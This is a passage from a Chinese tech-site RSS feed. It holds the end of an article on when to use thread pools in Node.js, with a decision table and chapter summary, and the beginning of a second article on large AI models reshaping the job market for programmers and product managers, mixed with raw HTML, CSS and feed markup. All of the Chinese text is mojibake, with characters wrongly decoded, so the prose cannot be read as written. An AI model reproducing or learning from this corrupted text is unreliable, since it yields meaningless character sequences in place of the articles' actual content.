<p>è‹¥ä¸ç¡®å®šæŸä»»åŠ¡æ˜¯å¦é€‚åˆä½¿ç”¨çº¿ç¨‹æ± ï¼Œå¯é€šè¿‡ä»¥ä¸‹ä¸‰æ­¥åˆ¤æ–­ï¼š</p>
<ol>
<li><strong>åˆ¤æ–­ä»»åŠ¡ç±»å‹</strong>ï¼šæ˜¯CPUå¯†é›†å‹ï¼ˆè®¡ç®—è€—æ—¶ï¼‰è¿˜æ˜¯I/Oå¯†é›†å‹ï¼ˆç­‰å¾…è€—æ—¶ï¼‰ï¼Ÿå‰è€…ä¼˜å…ˆè€ƒè™‘çº¿ç¨‹æ± ï¼Œåè€…ä¼˜å…ˆç”¨åŸç”Ÿå¼‚æ­¥APIï¼›</li>
<li><strong>è¯„ä¼°ä»»åŠ¡è€—æ—¶</strong>ï¼šå•ä»»åŠ¡æ‰§è¡Œæ—¶é—´æ˜¯å¦è¶…è¿‡10msï¼Ÿè‹¥ä½äº10msï¼Œçº¿ç¨‹æ± å¼€é”€å¯èƒ½è¶…è¿‡æ”¶ç›Šï¼›</li>
<li><strong>åˆ†æçŠ¶æ€ä¾èµ–</strong>ï¼šä»»åŠ¡æ˜¯å¦éœ€è¦é¢‘ç¹ä¸ä¸»çº¿ç¨‹æˆ–å…¶ä»–çº¿ç¨‹å…±äº«çŠ¶æ€ï¼Ÿä¾èµ–åº¦é«˜åˆ™ä¸é€‚åˆç”¨çº¿ç¨‹æ± ã€‚</li>
</ol>
<p>æœ€ç»ˆå†³ç­–å¯å‚è€ƒä¸‹è¡¨ï¼š</p>






























<table><thead><tr><th>ä»»åŠ¡ç‰¹å¾</th><th>æ˜¯å¦é€‚åˆçº¿ç¨‹æ± </th><th>æ¨èæ–¹æ¡ˆ</th></tr></thead><tbody><tr><td>CPUå¯†é›†ï¼Œæ‰§è¡Œæ—¶é—´&gt;10msï¼Œæ— çŠ¶æ€ä¾èµ–</td><td>æ˜¯</td><td>çº¿ç¨‹æ± +Workerçº¿ç¨‹</td></tr><tr><td>I/Oå¯†é›†ï¼Œå¦‚æ•°æ®åº“æŸ¥è¯¢ã€HTTPè¯·æ±‚</td><td>å¦</td><td>åŸç”Ÿå¼‚æ­¥API+libuvçº¿ç¨‹æ± </td></tr><tr><td>è½»é‡ä»»åŠ¡ï¼Œæ‰§è¡Œæ—¶é—´&lt;10ms</td><td>å¦</td><td>ä¸»çº¿ç¨‹ç›´æ¥æ‰§è¡Œ</td></tr><tr><td>æ‰¹é‡ä»»åŠ¡ï¼Œéœ€æ§åˆ¶å¹¶å‘æ•°</td><td>æ˜¯</td><td>çº¿ç¨‹æ± +ä»»åŠ¡é˜Ÿåˆ—</td></tr></tbody></table>
<h3 data-id="heading-23">æœ¬ç« å°ç»“</h3>
<p>æœ¬ç« é€šè¿‡ä¸‰ä¸ªå°èŠ‚ï¼Œå®Œæˆäº†å¯¹Node.jså¹¶å‘æ¨¡å‹ä¸çº¿ç¨‹æ± çš„åŸºç¡€è®¤çŸ¥æ„å»ºï¼š</p>
<ul>
<li>1.1èŠ‚æ¾„æ¸…äº†â€œå•çº¿ç¨‹â€è¯¯åŒºï¼šNode.jsæ˜¯â€œä¸»çº¿ç¨‹å•çº¿ç¨‹+å¤šçº¿ç¨‹ååŒâ€çš„å¹¶å‘æ¨¡å‹ï¼Œlibuvçº¿ç¨‹æ± ä¸Worker Threadsæ˜¯å…³é”®è¾…åŠ©ï¼›</li>
<li>1.2èŠ‚æ˜ç¡®äº†çº¿ç¨‹æ± çš„æ ¸å¿ƒä»·å€¼ï¼šè§£å†³ä¸»çº¿ç¨‹é˜»å¡ã€é™ä½çº¿ç¨‹å¼€é”€ã€æä¾›å¯æ§çš„ä»»åŠ¡ç®¡ç†ï¼›</li>
<li>1.3èŠ‚åˆ’å®šäº†é€‚ç”¨è¾¹ç•Œï¼šCPUå¯†é›†ã€æ‰¹é‡ä»»åŠ¡ã€èµ„æºå—é™åœºæ™¯é€‚ç”¨ï¼ŒI/Oå¯†é›†ã€è½»é‡ä»»åŠ¡ã€çŠ¶æ€ä¾èµ–åœºæ™¯ç¦ç”¨ã€‚</li>
</ul>
<p>æŒæ¡è¿™äº›åŸºç¡€è®¤çŸ¥åï¼Œä¸‹ä¸€ç« æˆ‘ä»¬å°†æ·±å…¥çº¿ç¨‹æ± çš„å†…éƒ¨ï¼Œæ‹†è§£å…¶æ ¸å¿ƒç»„ä»¶ä¸å·¥ä½œæœºåˆ¶ï¼Œä»â€œçŸ¥å…¶ç„¶â€èµ°å‘â€œçŸ¥å…¶æ‰€ä»¥ç„¶â€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AIå¤§æ¨¡å‹ä¼˜åŒ–äº†è°ï¼Ÿç¨‹åºå‘˜è¿˜æ˜¯äº§å“ç»ç†ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7583871118948548658</link>    <guid>https://juejin.cn/post/7583871118948548658</guid>    <pubDate>2025-12-15T08:10:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583871118948548658" data-draft-id="7583906870826762249" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AIå¤§æ¨¡å‹ä¼˜åŒ–äº†è°ï¼Ÿç¨‹åºå‘˜è¿˜æ˜¯äº§å“ç»ç†ï¼Ÿ"/> <meta itemprop="keywords" content="LLM"/> <meta itemprop="datePublished" content="2025-12-15T08:10:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ™ºæ³ŠAI"/> <meta itemprop="url" content="https://juejin.cn/user/3572727470361578"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AIå¤§æ¨¡å‹ä¼˜åŒ–äº†è°ï¼Ÿç¨‹åºå‘˜è¿˜æ˜¯äº§å“ç»ç†ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3572727470361578/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ™ºæ³ŠAI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T08:10:55.000Z" title="Mon Dec 15 2025 08:10:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸€åå¤±ä¸šä¸­çš„ç¨‹åºå‘˜ï¼Œå› ä¸€æ¬¡åˆ›æ–°çš„æ±‚èŒæ–¹å¼å¼•å‘å…¨ç½‘å…³æ³¨ã€‚æ—é»˜ç„¶ä»¥999å…ƒçš„ä»·æ ¼ï¼Œåœ¨ä¸Šæµ·åœ°é“é™†å®¶å˜´ç«™ç§Ÿç”¨å¹¿å‘Šä½5å¤©ï¼Œå±•ç¤ºä¸ªäººç®€å†äºŒç»´ç ï¼Œæ‰«ç å³å¯è¿½æº¯å…¶"è¾—è½¬çš„èŒåœºç”Ÿæ¶¯"ã€‚</p>
<p>æ—é»˜ç„¶äº2023å¹´5æœˆé€‰æ‹©"ä¸»åŠ¨ç¦»èŒ"ã€‚åŒå¹´3æœˆ15æ—¥GPT-4å‘å¸ƒåï¼Œä»–ä¸ä¼—å¤šå¼€å‘è€…åŒæ ·é™·å…¥æ²‰æ€â€”â€”é¢å¯¹ç”Ÿæˆå¼AIçš„æµªæ½®ï¼Œæ˜¯åšå®ˆä¼ ç»Ÿå²—ä½ï¼Œè¿˜æ˜¯æŠ•èº«æŠ€æœ¯å˜é©ï¼Ÿ</p>
<p>å½¼æ—¶çš„ä»–ä»»èŒäºä¸Šæµ·æŸé£Ÿå“é›†å›¢æ•°æ®éƒ¨é—¨ï¼Œä½œä¸ºAIç«èµ›çš„å¸¸èƒœé€‰æ‰‹ï¼Œä»–è‡ªç§°"æŠ€æœ¯æå®¢"ï¼Œä¸šä½™æ—¶é—´åœ¨æœ¬åœ°äº’è”ç½‘ç¤¾ç¾¤ä¸­é¢‡æœ‰åæœ›ã€‚</p>
<p>2023å¹´5æœˆå®Œæˆ3åœºAIæ²™é¾™åï¼Œæ—é»˜ç„¶æ„è¯†åˆ°å¤§æ¨¡å‹çš„çƒ­æ½®å·²è¿œè¶…"å¿«é€Ÿå¢é•¿"çš„èŒƒç•´ã€‚å‚ä¸æ´»åŠ¨çš„ä¼ä¸šä¸»ä»¬æ™®éé™·å…¥æŠ€æœ¯ç„¦è™‘ï¼Œä»åˆ¶é€ ä¸šåˆ°æœåŠ¡ä¸šï¼Œå„ç±»è§„æ¨¡å…¬å¸å‡å¼€å§‹å¸ƒå±€å¤§æ¨¡å‹ç ”å‘ã€‚</p>
<p>ç„¶è€Œå…¶é›‡ä¸»â€”â€”ä¸€å®¶ä¸»è¥ä¸œå—äºšæ°´æœè¿›å£çš„ä¸Šå¸‚ä¼ä¸šï¼Œå¯¹AIè½¬å‹æ€åº¦å†·æ·¡ã€‚"AIæ˜¯æœªæ¥èµ›é“""å¿…é¡»è½¬å‹ç®—æ³•é¢†åŸŸ""æˆ–å°†æˆä¸ºè¡Œä¸šæ–°é”"â€¦â€¦æ€€æ£æ­¤ç±»æŠ±è´Ÿï¼Œä»–æ¯…ç„¶è¸ä¸ŠèŒä¸šè½¬å‹ä¹‹è·¯ã€‚</p>
<p>å¤§æ¨¡å‹æµªæ½®å¸­å·è€Œæ¥ï¼Œäº’è”ç½‘è¡Œä¸šé²œå°‘é­é‡å¦‚æ­¤å‰§çƒˆçš„æŠ€æœ¯è¿­ä»£ã€‚ä¼ ç»ŸæŠ€æœ¯ä»ä¸šè€…ä¸å‰æ²¿AIä¼ä¸šçš„èƒ½åŠ›éœ€æ±‚ï¼ŒäºŒè€…é—´çš„åŒ¹é…å£å’è¿œè¶…é¢„æœŸã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8556174cfa4047b58c145cc28f4f65c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766391054&amp;x-signature=uoaIaBYsOXT3reN7mMPKKCJk2W8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>æ›´å¤šAIå¤§æ¨¡å‹å­¦ä¹ è§†é¢‘åŠèµ„æºï¼Œéƒ½åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fyuan.zhipoai.cn%2F" target="_blank" title="https://yuan.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</strong></p>
<p><strong>01</strong></p>
<p><strong>æ¶ˆå¤±çš„äº§å“ç»ç†</strong></p>
<p>äº‹æƒ…æ²¡æœ‰æ—é»˜ç„¶æƒ³å¾—é¡ºåˆ©ï¼Œ"é—¨æ§›ç¡®å®å¤ªé«˜äº†ï¼Œå¾ˆå¤šæ‹›è˜è¦æ±‚æ˜¯èƒ½å¼€å‘åº•å±‚å¤§æ¨¡å‹"ã€‚æ—é»˜ç„¶è‡ªè®¤åœ¨å†™ä»£ç è¿™ä»¶äº‹ä¸Šæ˜¯æœ‰å¤©èµ‹çš„ï¼Œåœ¨AIæ¯”èµ›ä¸Šé å†™ä¸­å°æ¨¡å‹ä¹Ÿè·è¿‡ä¸å°‘å¥–é¡¹ï¼Œä½†å¯¹å¤§æ¨¡å‹ç»éªŒå¯¥å¯¥ã€‚</p>
<p>æ›´ç³Ÿç³•çš„æ˜¯ï¼Œæ¯•ä¸šäºæ¹–å—å¤§å­¦å¸‚åœºè¥é”€ä¸“ä¸šçš„ä»–ï¼Œæ›¾ç»é è‡ªå­¦Pythoné—¯å…¥æŠ€æœ¯åœˆï¼Œä½†"è‹±é›„ä¸é—®å‡ºå¤„"çš„æ³•åˆ™åœ¨å¤§æ¨¡å‹è¡Œä¸šå¤±çµäº†ï¼Œ"å­¦å†ä¸Šå°±å¡æ­»äº†"ã€‚å¸‚åœºè¾¾æˆäº†è‡ªå·±çš„å…±è¯†ï¼Œè¿™ä¸ªå…±è¯†å°±æ˜¯è¿½æ±‚ç¡®å®šæ€§ï¼Œä»¥å®ç°ä¸ç¡®å®šæ€§ã€‚</p>
<p>è¦åœ¨å¤§æ¨¡å‹è¡Œä¸šæœ‰ä¸€å¸­ä¹‹åœ°ï¼Œäººæ‰å¯†é›†å’Œèµ„é‡‘å¯†é›†ä¸å¦ï¼Œæ˜¯å”¯äºŒå†³å®šç”Ÿæ­»çš„æ ¸å¿ƒè¦ç´ ã€‚</p>
<p>å¤§å®¶å¤šå°‘æ¸…æ¥šå¦‚ä»Šå¤§ç¯å¢ƒä¸‹æŠ•èµ„äººçš„è°¨æ…ï¼Œè‡³äºäººæ‰ï¼Œæƒ…å†µè¦ä»¤äººå›°æƒ‘å¾—å¤šâ€”â€”ä»å¤§å‚é«˜ç®¡ã€åˆ›ä¸šå…¬å¸è€æ¿ï¼Œå†åˆ°æŠ•èµ„äººã€çŒå¤´ï¼Œæ²¡äººäº†è§£æ–¹å‘ï¼Œéƒ½åœ¨ä»é›¶æ‘¸ç´¢èµ·ã€‚</p>
<p>ä½œä¸ºå¤§æ¨¡å‹åˆåˆ›å…¬å¸å…±ç”Ÿå›¢é˜Ÿè´Ÿè´£äººï¼Œé™ˆå¯æœ€è¿‘åšäº†ä¸€ä¸ªå†³å®šï¼Œæš‚æ—¶æç½®æ‹›è˜äº§å“ç»ç†çš„å·¥ä½œã€‚</p>
<p>åˆ›åŠå…±ç”Ÿå›¢é˜Ÿå‡ ä¸ªæœˆåï¼Œå¸‚åœºç»™å¿™äºå¸çº³äººæ‰çš„é™ˆå¯ä¸Šäº†æœ€æ–°ä¸€è¯¾â€”â€”å¤§æ¨¡å‹å…¬å¸å¾ˆéš¾åœ¨äº’è”ç½‘ä½“ç³»å†…æ‰¾åˆ°å¯ä»¥ç»éªŒå¤ç”¨çš„äº§å“ç»ç†ã€‚æ”¾å¼ƒæ‹›è˜åï¼Œä»–å’Œå‡ ä½AIå·¥ç¨‹å¸ˆå‡ºèº«çš„åˆ›å§‹å›¢é˜Ÿæˆå‘˜ï¼Œå…¼èµ·äº†å…¬å¸äº§å“ç»ç†çš„èŒè´£ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20a79702934d4c96acd6fb6239a38c8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766391054&amp;x-signature=kW8vjpT3K7OL448JN8MuQh2wuf4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>"æˆ‘ä»¬ç­›é€‰è¿‡å¾ˆå¤šäº§å“ç»ç†çš„ç®€å†ï¼ŒåšUIçš„ã€äº§å“çš„ç­‰ç­‰ï¼Œä½†ä»–ä»¬çš„å…±åŒé—®é¢˜æ˜¯ï¼Œä¸äº†è§£å¤§æ¨¡å‹é¡¹ç›®çš„åº•å±‚æœºåˆ¶ï¼Œå¯¼è‡´æ²¡æœ‰åŠæ³•å¾ˆå¿«è¿ç§»ç»éªŒã€‚"é™ˆå¯è¯´é“ï¼Œ"å¦‚æœç†è§£ç¨‹åº¦æ˜¯'ç”»ä¸€ä¸ªç•Œé¢'ï¼Œé‚£æœ€ååŸºæœ¬ä¸€å¡Œç³Šæ¶‚ã€‚"</p>
<p>å›½äº§å¤§æ¨¡å‹å·²ç»å·äº†ä¸€å¹´åŠï¼Œä½†é™ˆå¯è‡³ä»Šæ²¡æœ‰çœ‹åˆ°"æ¯”è¾ƒé«˜è´¨é‡"çš„äº§å“ç»ç†å‡ºç°ã€‚ä»–äº§ç”Ÿäº†å·¨å¤§çš„ç´§è¿«æ„Ÿã€‚</p>
<p>ä»–è¯´ï¼Œåˆ›åŠå…¬å¸å‡ ä¸ªæœˆçš„æ—¶é—´é‡Œï¼Œå›¢é˜Ÿæ›´åŠ åšå®šäº†è¿™æ ·çš„è®¤çŸ¥ï¼š"æˆ‘ä»¬å°è¯•ä»åŸå­åŒ–è§’åº¦æ¥çœ‹ï¼Œå¦‚æœä¸€ä¸ªæ–°æŠ€æœ¯è®©å•ä¸ªä¸ªä½“è§’è‰²å‘ç”Ÿæ ¹æœ¬æ€§å˜åŒ–ï¼Œé‚£ä¹ˆç”±è¿™æ ·ä¸€ä¸ªä¸ªä½“æ‰€ç»„æˆçš„å•ä½å’Œç³»ç»Ÿï¼Œè‡ªç„¶ä¹Ÿé€ƒä¸è¿‡å˜åŒ–ã€‚"</p>
<p>å¤§æ¨¡å‹çŒå¤´Jasonåˆ™æ„Ÿè§‰"æ‰€æœ‰äººéƒ½åœ¨è¿½é€åŒä¸€æ‹¨äºº"ï¼Œå°±æ˜¯æ¸…åå¸®é‚£åå‡ ä¸ªï¼Œ"å¦‚æœè¿½æ±‚å¯¹åº•å±‚å¤§æ¨¡å‹çš„è®¤çŸ¥ï¼Œå›½å†…åªæœ‰ä»–ä»¬"ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aece5e9f35b74e239a43f5be350f6c73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766391054&amp;x-signature=hEgauR%2B6m8ejRqGZz0bYOtzGVvI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>"æ— è®ºåˆ›ä¸šå…¬å¸è¿˜æ˜¯å¤§å‚éƒ½åœ¨é—®æˆ‘åŒæ ·çš„äº‹æƒ…ï¼šå”æ°è€å¸ˆï¼ˆæ™ºè°±AIé¦–å¸­ç§‘å­¦å®¶ã€æ¸…åå¤§å­¦è®¡ç®—æœºç³»æ•™æˆï¼‰çš„å‡ä¸€ï¼ˆç›´å±ä¸‹çº§ï¼‰èƒ½ä¸èƒ½æŒ–æ¥ï¼Ÿå²‚å‡¡è¶…ï¼ˆæ·±è¨€ç§‘æŠ€åˆ›å§‹äººã€æ¸…åå¤§å­¦äººå·¥æ™ºèƒ½ç ”ç©¶é™¢æ•™æˆå­™èŒ‚æ¾çš„å­¦ç”Ÿï¼‰çš„å‡ä¸€èƒ½ä¸èƒ½æŒ–æ¥ï¼Ÿ"</p>
<p>çŸ­æ—¶é—´å†…ï¼Œæ¸…åå¸®åä½™äººæˆäº†å›½å†…å¤§æ¨¡å‹äººæ‰å¸‚åœºå”¯ä¸€çš„ç¡®å®šæ€§ï¼Œè¦æ‹›ä»–ä»¬ä¹‹å¤–çš„äººï¼Œå¤§å®¶å‡ ä¹è¿æ‹›è˜è¦æ±‚æ€ä¹ˆå†™éƒ½æ²¡æœ‰å¤´ç»ªã€‚èµ„æ·±çŒå¤´è‚–æ©æ›¾æ¥è¿‡å‡ ä¸ªäº’è”ç½‘å¤§å‚çš„å¤§æ¨¡å‹æ‹›è˜éœ€æ±‚ï¼Œåªä¸è¿‡å¯¹æ¥çš„è¿‡ç¨‹ä»¤ä»–æœ‰äº›å“‘ç„¶å¤±ç¬‘ã€‚</p>
<p>"æŸå¤´éƒ¨å¤§å‚æ ¹æœ¬ä¸çŸ¥é“æƒ³è¦ä»€ä¹ˆï¼Œè¿˜å¼‚æƒ³å¤©å¼€æƒ³ä»OpenAIã€Metaä»€ä¹ˆçš„æŒ–äººã€‚""æœ‰äº›å¤§å‚å¤§æ¨¡å‹å›¢é˜ŸåŠå…¬å®¤éƒ½å¼€åˆ°å›½å¤–äº†ï¼Œä½†æ˜¯ä¹Ÿæ²¡åšå‡ºä»€ä¹ˆæ°´èŠ±ï¼Œä¹Ÿä¸çŸ¥é“æœªæ¥è¦å¹²ä»€ä¹ˆã€‚"æŠ•èµ„äººä¹Ÿåœ¨é›¾é‡Œçœ‹èŠ±ã€‚</p>
<p>æ›¾ç»æœ‰æŠ•èµ„äººé—®é™ˆå¯ï¼Œæ˜¯ä¸æ˜¯å›½å†…ï¼ˆå¤§æ¨¡å‹å…¬å¸ï¼‰å·²ç»æ³›æ»¥äº†ï¼Œè¿™è®©é™ˆå¯æ„Ÿåˆ°æ— å¥ˆã€‚"æ ¹æœ¬ä¸å¯èƒ½ï¼ŒçœŸæ­£èƒ½åšåº•å±‚å¤§æ¨¡å‹çš„å§‹ç»ˆåªæœ‰é‚£ä¸€æ‹¨äººï¼Œæ— éæ˜¯å‡ ä¸ªå›¢é˜Ÿé—´ç»•æ¥ç»•å»ï¼Œè¿™ä¸ªæŠ€æœ¯å¾ˆéš¾çŸ­æœŸå†…æ‰©æ•£ã€‚"</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/821c878f9b3e4fa7ab54bb8c0553a03b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766391054&amp;x-signature=B1nagEaxlZpR2PxX9oMsTQlb1TM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>02</strong></p>
<p><strong>å¹¶éå–ä»£é‚£ä¹ˆç®€å•</strong></p>
<p>å¤§æ¨¡å‹æˆ–è®¸æ˜¯å±äºæŠ€æœ¯è¿½æ±‚è€…çš„æœ€å¥½çš„æ—¶ä»£ï¼Œå®ƒæ›´çº¯ç²¹ã€æ›´ä¸“æ³¨ã€æ›´å…·é•¿æœŸä»·å€¼ã€‚äº§å“ç«äº‰åŠ›çš„æ ¸å¿ƒå‡ ä¹å®Œå…¨èšç„¦äºæŠ€æœ¯å®åŠ›ã€‚</p>
<p>è¿™ç§å˜é©ä¹Ÿå‚¬ç”Ÿäº†è¡Œä¸šç„¦è™‘â€”â€”åœ¨æ–°ä¸€è½®æŠ€æœ¯æµªæ½®ä¸­ï¼Œè½ä¼è€…æ˜¯å¦ä¼šè¢«æ·˜æ±°ï¼Ÿåœ°é“ç«™æ±‚èŒå¹¿å‘Šå‘å¸ƒåï¼Œ50ä½™å®¶ä¼ä¸šè”ç³»äº†æ—é»˜ç„¶ï¼Œè¡¨é¢çœ‹æ˜¯èŒä¸šè½¬æŠ˜çš„æ›™å…‰ï¼Œä½†ç»è¿‡30å¤šè½®é¢è¯•ï¼Œä»–è·å¾—çš„å²—ä½é‚€çº¦ä»é›†ä¸­åœ¨æ•°æ®åˆ†æé¢†åŸŸã€‚</p>
<p>ä»–ä¸å¾—ä¸æ‰¿è®¤ï¼Œè‡ªå·±çš„"å¤§æ¨¡å‹ç†æƒ³"æˆ–è®¸éš¾ä»¥å®ç°ã€‚"å¤§æ¨¡å‹çš„å‡ºç°ï¼Œè®©ä¸‰å¹´Pythonå­¦ä¹ æŠ•å…¥ä¼¼ä¹å¤±å»äº†ä»·å€¼ã€‚"ä»–è§‚å¯Ÿåˆ°è¡Œä¸šæ­£å‘ˆç°ä¸¤æåˆ†åŒ–ï¼šæœ‰äººå‡­å€Ÿå¤§æ¨¡å‹æŠ€æœ¯åœ¨é«˜ç²¾å°–é¢†åŸŸæ¸¸åˆƒæœ‰ä½™ï¼Œä¹Ÿæœ‰äººå› "AIæ›¿ä»£è®º"é»¯ç„¶ç¦»èŒã€‚</p>
